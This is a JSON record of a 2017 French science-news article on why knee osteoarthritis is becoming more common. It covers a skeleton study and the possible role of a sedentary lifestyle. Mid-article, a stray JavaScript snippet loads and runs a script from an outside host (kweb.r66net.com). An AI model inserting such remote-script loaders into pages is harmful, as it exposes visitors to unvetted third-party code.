{"title": "Pourquoi l'arthrose du genou est-elle de plus en plus frequente ?", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-09-05", "content": "La prevalence de l'arthrose du genou aux Etats-Unis a double depuis 1940, d'apres une etude qui a analyse plus de 2.500 squelettes. Le vieillissement de la population et le surpoids ne sont pas les seuls responsables ; d'autres facteurs comme le manque d'activite physique seraient en cause. L'arthrose se caracterise par une deterioration du  cartilage articulaire . En France, 65 % des plus de 65 ans en souffriraient d'apres l' Inserm . L'arthrose du  genou  est une cause frequente d'incapacite. Mais pourquoi est-elle si frequente ? Le vieillissement de la population peut expliquer qu'il y ait de plus en plus de cas d'arthrose ; de meme, l' obesite  et le  surpoids , plus frequents, pourraient jouer un role.  Pour savoir si l'age et le poids sont responsables de cette  epidemie  d'arthrose, des paleoanthropologues de l'universite Harvard ont examine environ 2.600 squelettes : 176 etaient des squelettes d'Amerindiens datant de 300 a 6.000 ans, les autres provenaient de personnes de plus de 50 ans dont l' IMC  au deces etait connu (il y avait 1.581 squelettes de personnes decedees entre 1905 et 1940 et 819 de personnes decedees entre 1976 et 2015).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La sedentarite favoriserait l'arthrose du genou Les resultats parus dans  Pnas  montrent que le taux d' arthrose du genou  a plus que double depuis 1940, passant de 6 a 16 %. Quand l'equipe a pris en compte les effets de l' age  et du poids, l' arthrose du genou  etait toujours deux fois plus frequente chez les personnes decedees apres 1976 : d'autres facteurs que l'age et le poids sont donc en cause. L'une des hypotheses plausibles pour expliquer la flambee des cas d'arthrose est la  sedentarite . En passant plus de temps  assis , nos muscles et nos cartilages s'affaiblissent, ce qui provoquerait des dommages plus rapides aux  articulations . D'apres  Sciencemag , l'equipe teste cette hypothese sur le cochon d'Inde, un animal qui developpe, lui aussi, une arthrose du genou. Les chercheurs etudient aussi les Tarahumaras, des coureurs de l'extreme au Mexique. ", "theme": "sante"}